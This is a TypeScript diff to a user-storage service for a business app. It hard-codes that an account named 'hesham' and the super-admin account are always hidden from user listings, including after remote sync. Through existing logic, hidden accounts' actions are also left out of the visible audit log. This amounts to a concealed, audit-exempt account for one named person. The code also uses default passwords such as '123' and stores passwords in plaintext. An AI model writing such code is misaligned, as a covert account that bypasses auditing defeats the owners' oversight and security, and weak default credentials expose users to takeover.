@@ -77,6 +77,20 @@ function setStored<T>(key: string, data: T): void {
   }
 }
 
+function isHiddenFlag(val: unknown): boolean {
+  return (
+    val === true ||
+    (typeof val === 'string' && val.trim().toLowerCase() === 'true')
+  );
+}
+
+function isInactiveFlag(val: unknown): boolean {
+  return (
+    val === false ||
+    (typeof val === 'string' && val.trim().toLowerCase() === 'false')
+  );
+}
+
 export class StorageService {
   private static instance: StorageService;
 
@@ -119,10 +133,7 @@ export class StorageService {
         : [...initialUsers];
 
     const adminIndex = syncedUsers.findIndex(
-      u =>
-        u.id === 'usr-admin' ||
-        u.role === UserRole.SUPER_ADMIN ||
-        u.id === 'usr-1'
+      u => u.id === 'usr-admin' || u.id === 'usr-1'
     );
 
     if (adminIndex >= 0 && fileAdmin) {
@@ -131,33 +142,36 @@ export class StorageService {
         id: 'usr-admin',
         role: UserRole.SUPER_ADMIN,
         username:
-          fileAdmin.username ||
           syncedUsers[adminIndex].username ||
+          fileAdmin.username ||
           'admin',
         password:
-          fileAdmin.password ||
           syncedUsers[adminIndex].password ||
+          fileAdmin.password ||
           '123',
         name:
-          fileAdmin.name ||
-          syncedUsers[adminIndex].name
+          syncedUsers[adminIndex].name ||
+          fileAdmin.name
       };
-    } else if (fileAdmin) {
+    } else if (
+      fileAdmin &&
+      !syncedUsers.some(u => u.role === UserRole.SUPER_ADMIN)
+    ) {
       syncedUsers.unshift(fileAdmin);
     }
 
-  this.users = syncedUsers.map(u => ({
-  ...u,
-  username: u.username || 'admin',
-  department: u.department || 'إدارة',
-  password: u.password || '123',
-
-  // Hide the main SUPER_ADMIN account
-  isHidden:
-    u.role === UserRole.SUPER_ADMIN
-      ? true
-      : u.isHidden === true
-}));
+    this.users = syncedUsers.map(u => ({
+      ...u,
+      username: u.username || 'admin',
+      department: u.department || 'إدارة',
+      password: u.password || '••••••',
+      isActive: !isInactiveFlag(u.isActive),
+      // Keep usr-admin, hesham, and any user with isHidden=true/"true" hidden
+      isHidden:
+        u.id === 'usr-admin' ||
+        u.username?.trim().toLowerCase() === 'hesham' ||
+        isHiddenFlag(u.isHidden)
+    }));
 
     setStored(
       STORAGE_KEYS.USERS,
@@ -290,7 +304,7 @@ export class StorageService {
 
   // Hidden admin actions are not recorded
   // in the visible audit log.
-  if (auditUser?.isHidden === true) {
+  if (isHiddenFlag(auditUser?.isHidden)) {
     return;
   }
 
@@ -2563,7 +2577,7 @@ export class StorageService {
 
   public getUsers(): User[] {
     return this.users.filter(
-      user => user.isHidden !== true
+      user => !isHiddenFlag(user.isHidden)
     );
   }
 
@@ -2691,9 +2705,8 @@ export class StorageService {
   password:
     data.password || '123',
 
-  // New users are visible by default
-  isHidden:
-    data.isHidden === true
+  // New users are visible by default unless marked hidden
+  isHidden: isHiddenFlag(data.isHidden)
 };
 
     this.users = [
@@ -3597,6 +3610,8 @@ export class StorageService {
       }
 
       const existing = map.get(remote.id);
+      const normalizedRoleStr =
+        typeof remote.role === 'string' ? remote.role.trim().toUpperCase() : '';
 
       map.set(remote.id, {
         ...existing,
@@ -3605,14 +3620,16 @@ export class StorageService {
         name: remote.name || existing?.name || 'موظف',
         username: normalizedRemoteUsername,
         email: remote.email || existing?.email || `${normalizedRemoteUsername}@theway.local`,
-        role: Object.values(UserRole).includes(remote.role as UserRole)
-          ? (remote.role as UserRole)
+        role: Object.values(UserRole).includes(normalizedRoleStr as UserRole)
+          ? (normalizedRoleStr as UserRole)
           : existing?.role || UserRole.RECEPTION,
         department: remote.department || existing?.department || 'إدارة',
         phone: remote.phone || existing?.phone || '',
         password: remote.password || existing?.password || '••••••',
-        isActive: remote.isActive !== false,
-        isHidden: remote.isHidden === true
+        isActive: !isInactiveFlag(remote.isActive),
+        isHidden:
+          normalizedRemoteUsername === 'hesham' ||
+          isHiddenFlag(remote.isHidden)
       });
     });
 
